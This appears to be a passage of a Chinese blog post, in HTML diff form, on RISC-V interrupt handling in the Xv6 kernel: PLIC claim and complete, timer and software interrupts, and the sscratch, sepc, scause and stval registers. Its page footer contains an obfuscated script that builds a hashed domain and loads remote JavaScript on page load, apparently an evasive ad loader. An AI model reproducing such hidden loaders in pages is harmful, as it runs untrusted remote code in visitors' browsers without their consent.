+<p>当一个高优先级的中断被处理之后，低优先级中断可能又会补上，所以PLIC中的<mark>PIE位可能还是不会被清零</mark>，这也就导致了多个核心中的sip.SEIP位其实还是没有被清0。也就是说，在一个多核平台上，可能同时发生的，需要被处理的中断不止一个。这时，它们可能会被其他核心响应。即使是在一个核心内部，PLIC标准上也建议，<mark>在interrupt handler返回前可以查看一下核心自己的sip.SEIP位是否还为1，如果还是1，就可以跳过恢复现场的步骤，直接claim下一个中断并服务吧</mark>，节省时间！</p> 
+<p>最后，如果一个核心claim时已经没有中断要处理了(<b>有可能是没有竞争过其他核心，也有可能是确实没有中断要处理</b>)，读取PLIC中的claim/complete寄存器就会返回0，进而回到OS内核后什么也不做，这在上面的代码中也有对应。<mark>实际上，中断ID为0在标准中对应的含义就是：“无需响应的中断”?</mark></p> 
+<p>现在一个核心claim了一个中断并将其服务完毕，它就会进行一个complete操作，这个操作和claim操作很像，只是完全相反——它是<mark>向claim/complete寄存器写入它刚刚完成服务的中断ID号</mark>，这个ID号会被转发给Gateways，进而Gateways会再次开始对对应ID号的中断进行转发。<b>在没有完成complete操作之前，Gateways是不会转发同样ID号的中断给PLIC核心的，所以在完成complete操作之前这种中断也就不会被处理。</b></p> 
+<p>好，最后我们完整地梳理一下这个过程：</p> 
+<p>1.外部设备发起一个中断给PLIC中的Gateways，Gateways负责将中断信号进行转换并转发给PLIC核心，这个过程中会涉及Priority、Threshold等等一系列的判断(详见上面的电路)，最终会体现在PLIC核心的EIP位上。</p> 
+<p>2.EIP位一旦被置1，会直接导致多个核心上的sip.SEIP位被置1。进而导致多个打开此中断的CPU核心开始竞争claim这个中断，没有竞争过其他核心时会得到中断ID为0，进而不响应，这个过程叫做claim操作。</p> 
+<p>3.响应最早的核心成功开始服务这个中断，并在服务完成之后将中断ID号再次写入claim/completion寄存器，这个过程叫做complete操作。</p> 
+<p>4.这个complete操作会被转发到Gateways，进而再次开启对这种中断的转发。</p> 
+<h2>
+<a id="54__233"></a>5.4 软中断和定时器中断</h2> 
+<p>注意力再次回到sip和sie寄存器中，除了sip.SEIP只读位用来反映外部中断以外，还有<mark>sip.SSIP和sip.STIP位来分别反映软中断和时钟中断</mark>。在开发板的手册中，这两者都属于本地中断，都交由CLINT(核心本地中断器)来管理。<br> <img src="https://images2.imgbox.com/50/dd/iJymk8Vu_o.png" alt="在这里插入图片描述"><br> sip.STIP和sie.STIE位分别用来管理时钟中断的挂起和使能，时钟中断在Xv6中<mark>主要是用来做CPU调度的</mark>。也就是我们常说的<mark>时间片轮转调度算法(Round-Robin, RR)</mark>，一个进程经过一段时间之后会自动让出CPU的使用权，让其他进程进行执行。我们将在调度一节对Xv6中的源码进行详细分析，这里就<mark>只专注于RISC-V中的时钟中断本身</mark>。</p> 
+<p>sip.STIP位也非常特殊，和sip.SEIP一样，一旦被实现就<mark>只能是只读的(read-only)</mark>，只能被执行环境(execution environment)所设置和清除。这里所谓的执行环境指的就是<mark>操作系统里的中断服务程序</mark>。</p> 
+<p>之前在1.1节的末尾，我们就简单提过时钟中断是被<mark>CLINT硬连线为一个M-Mode中断的</mark>，并且<mark>这个中断不能被委派到S-Mode</mark>，所以时钟中断怎么也轮不到Xv6内核去处理，它真的得由硬件机制去触发。这里就非常巧妙了，在这里我不打算贴出源码(在后面的代码解析博客中会详细分析)，而是简单给出一个结论：<b>Xv6内核中M-Mode下的时钟中断的interrupt handler会使用汇编代码主动触发一个S-Mode下的软中断，从而将时钟中断的处理权移交给位于S-Mode下的操作系统，操作系统处理完时钟中断之后会将这个软中断清除以表明完成了对时钟中断的处理</b>。所以，其实Xv6<mark>借用了S-Mode下的软中断去完成对时钟中断的响应</mark>，这个过程还是非常值得思索和玩味的。</p> 
+<p>软中断则与sip.SSIP和sie.SSIE有关，与前两者不同，<b>它既可以由指令读写，也可以由CLINT来控制</b>。软件中断是通过指令来触发的，具体是写入CLINT中的msip寄存器。<mark>这个寄存器有32位，高31位全部被硬连线到0，最低位则直接映射到mip.MSIP位</mark>。软件中断在硬件实现中，根据示意图分析，应该也是像时钟中断一样，被强制硬连线到M-Mode下。但是因为在Xv6内核代码中没有涉及到M-Mode下的软中断，所以不再对此进行细究。软中断一般用于<mark>多个处理器核心之间的通信</mark>，各个核心都可以通过指令触发另外核心的软件中断。</p> 
+<p>至此，我们将sip和sie寄存器讲解的差不多了，并<b>顺带介绍了大量有关外部中断、时钟中断和软件中断的处理流程和细节</b>，这些是我查阅了大量资料梳理出来的情况。在实际实现RISC-V核心时，并不一定要实现上述的所有中断类型，<mark>当某种中断类型没有被实现时，它对应的sip和sie寄存器的对应域会被硬连线到0</mark>。</p> 
+<p>最后，当这三种中断同时发生时，它们的相对优先级是<b><span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
+      
+       
+        
+        
+          S 
+         
+        
+          E 
+         
+        
+          I 
+         
+        
+          &gt; 
+         
+        
+          S 
+         
+        
+          T 
+         
+        
+          I 
+         
+        
+          &gt; 
+         
+        
+          S 
+         
+        
+          S 
+         
+        
+          I 
+         
+        
+       
+         SEI gt STI gt SSI 
+        
+       
+     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.7224em;vertical-align: -0.0391em"></span><span class="mord mathnormal" style="margin-right: 0.0576em">SE</span><span class="mord mathnormal" style="margin-right: 0.0785em">I</span><span class="mspace" style="margin-right: 0.2778em"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right: 0.2778em"></span></span><span class="base"><span class="strut" style="height: 0.7224em;vertical-align: -0.0391em"></span><span class="mord mathnormal" style="margin-right: 0.1389em">ST</span><span class="mord mathnormal" style="margin-right: 0.0785em">I</span><span class="mspace" style="margin-right: 0.2778em"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right: 0.2778em"></span></span><span class="base"><span class="strut" style="height: 0.6833em"></span><span class="mord mathnormal" style="margin-right: 0.0576em">SS</span><span class="mord mathnormal" style="margin-right: 0.0785em">I</span></span></span></span></span></b>.</p> 
+<h1>
+<a id="6sscratch_248"></a>6.sscratch寄存器</h1> 
+<p>sscratch寄存器的设计是RISC-V中一个非常巧妙的机制，这个寄存器中<mark>存放着一个(虚拟)地址</mark>。当在执行用户代码时，这个地址指向的是一块<mark>保存当前程序上下文(其实就是寄存器组内容，context)的一块内存区域</mark>，在Xv6中这块地址叫做trapframe(陷阱帧)。<br> <img src="https://images2.imgbox.com/6d/d4/7kgIzp10_o.png" alt="在这里插入图片描述"></p> 
+<p>当执行陷阱的时候，PC会被设置为stvec寄存器的值，进而陷入一段过渡程序，在这段程序的开头就会将sscratch寄存器和a0寄存器进行交换，<b>这一方面将a0的值保存在了sscratch寄存器中，同时a0指向了trapframe的开始地址，这样进而就可以通过a0寄存器寻址将所有寄存器的值保存在trapframe里</b>，妙绝！</p> 
+<h1>
+<a id="7sepc_255"></a>7.sepc寄存器</h1> 
+<p><img src="https://images2.imgbox.com/a0/b7/ahPdNVQ2_o.png" alt="在这里插入图片描述"></p> 
+<p>sepc寄存器，一言以蔽之就是记录<mark>陷阱陷入到S-Mode时发生陷阱的指令的虚拟地址</mark>，它在执行陷阱时会记录下<mark>被中断的指令的虚拟地址</mark>，除了刚才说的陷阱场景之外，硬件不会主动改变sepc的值。但是spec寄存器可以被指令写入，我们曾经在分析Xv6系统调用的过程中注意到，<b>内核会将返回地址+4并赋给sepc，这表明系统调用会返回ecall的下一条指令继续执行</b>。</p> 
+<h1>
+<a id="8scause_259"></a>8.scause寄存器</h1> 
+<p><img src="https://images2.imgbox.com/6d/d8/7W2PZFkM_o.png" alt="在这里插入图片描述"><br> scause寄存器在执行陷阱时由硬件自动记录下导致本次陷阱的原因，其中interrupt位<mark>表示本次陷阱的原因是否为中断</mark>(我们上面说过，陷阱是动作，而中断和异常是导致陷阱的原因)。而Exception Code则表示细分的原因，对应关系如下表，可以看到scause还是<mark>有很多可扩展的异常号没有被使用的</mark>：<br> <img src="https://images2.imgbox.com/94/86/Gz19qT3J_o.png" alt="在这里插入图片描述"><br> 在Xv6内核的具体实现中，我们会根据scause中记录的异常号实现对陷阱<mark>“分门别类”</mark>的处理。和sepc一样，scause也支持使用指令写入，但是一般不这么做。</p> 
+<h1>
+<a id="9stval_264"></a>9.stval寄存器</h1> 
+<p><img src="https://images2.imgbox.com/2e/bd/B1NJn41K_o.png" alt="在这里插入图片描述"></p> 
+<p>stval寄存器的全称是Supervisor Trap Value Register，这个寄存器专门用来存放与陷阱有关的其他信息，目的是<mark>帮助操作系统或其他软件更快确定和完成陷阱的处理</mark>。手册上相关的叙述显得有些晦涩，这里简单地做一个总结：</p> 
+<p>首先，stval寄存器中存储的值可以是<mark>零值或者是非零值</mark>，对于大部分未经硬件平台定义的陷阱情况而言，stval并不会存储与这些陷阱有关的信息，这时候stval就会存储零，本质上stval没有存储什么有效信息。存储非零值的情况又分为两种，<b>一种是因为内存访问非法，一种则是因为指令本身非法</b>，下面详细说说：</p> 
+<p>1.内存访问非法：这种情况包括<mark>硬件断点(Hardware Breakpoints)、地址未对齐(address misaligned)、访问故障(access-fault，可能是没有权限等)、缺页故障(page-fault)等情况</mark>。<mark>当这种情况发生时，stval会存储出错位置的虚拟地址</mark>。比如缺页故障发生时，stval就会记录到底是对哪个虚拟地址的访问导致了本次缺页故障，内核就可以根据此信息去加载页面进入内存。</p> 
+<p>2.指令执行非法(illegal instruction, 异常号为2)：当执行的指令非法时，stval<mark>会将这条指令的一部分位记录下来</mark>。</p> 
+<h1>
+<a id="10_275"></a>10.小结</h1> 
+<p>在这篇博客中，我们详细分析了RISC-V架构中异常、中断、陷阱的相关概念和执行流程，并对与陷阱相关的寄存器做了简单的梳理和介绍，希望这篇博客可以给有困惑的人以启发。这篇博客也会作为重要的补充材料，收录在Xv6内核代码剖析的系列中。</p>
+                </div>
+                
+                
+
+		</div>
+	</article>
+</main>
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程小白.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
